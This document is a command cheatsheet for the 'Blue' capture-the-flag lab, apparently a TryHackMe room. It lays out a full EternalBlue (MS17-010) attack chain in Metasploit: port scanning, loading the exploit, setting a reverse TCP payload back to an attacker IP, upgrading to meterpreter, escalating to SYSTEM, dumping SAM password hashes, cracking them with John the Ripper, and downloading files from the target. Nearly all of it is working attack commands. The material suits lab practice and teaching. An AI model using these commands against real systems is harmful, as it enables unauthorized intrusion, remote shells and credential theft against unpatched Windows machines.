# Cheatsheet — Blue Room

| Command / Example | Purpose |
|---|---|
| `msfconsole` | Launch Metasploit console |
| `db_nmap -sS -sV -p- <target>` | Full Nmap scan and import results into Metasploit DB |
| `nmap -sS -sV -p1-1000 <target>` | Quick scan of ports 1–1000 |
| `nmap -p 445 --script smb-vuln-ms17-010 <target>` | Check MS17-010 with Nmap NSE |
| `search ms17-010` | Find MS17-010 related modules in msfconsole |
| `use exploit/windows/smb/ms17_010_eternalblue` | Load EternalBlue exploit module |
| `show options` | List module required/optional settings |
| `set RHOSTS <target-IP>` | Set target host(s) |
| `set payload windows/x64/shell/reverse_tcp` | Choose explicit payload for exploit |
| `set LHOST <attacker-IP>` / `set LPORT <port>` | Configure reverse listener addr/port |
| `exploit` / `run` | Launch the exploit |
| `exploit -z` | Launch exploit and background session immediately |
| `sessions` | List active sessions |
| `sessions -i <id>` | Interact with session `<id>` |
| `CTRL+Z` (interactive shell) / `background` (meterpreter) | Background current shell/session |
| `use post/multi/manage/shell_to_meterpreter` | Module to convert shell → meterpreter |
| `set SESSION <id>` | Select session for post module |
| `run` | Execute the loaded post module |
| `getsystem` | Attempt elevation to NT AUTHORITY\SYSTEM |
| `getuid` | Show current user context |
| `ps` | List running processes on target |
| `migrate <PID>` | Migrate Meterpreter to process `<PID>` |
| `hashdump` | Dump SAM account hashes (requires SYSTEM) |
| `cat > jon_hash.txt <<'EOF' ... EOF` | Save dumped hash to a file on attacker machine |
| `john --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt` | Crack NTLM hash with John the Ripper |
| `john --show jon_hash.txt` | Show cracked passwords from file |
| `meterpreter> search -f flag*` | Search filesystem for flag files |
| `meterpreter> download "<remote-path>" /tmp/flag.txt` | Download a target file to attacker |
| `meterpreter> cat "<remote-path>"` or `shell` → `type "<remote-path>"` | View file contents on target |
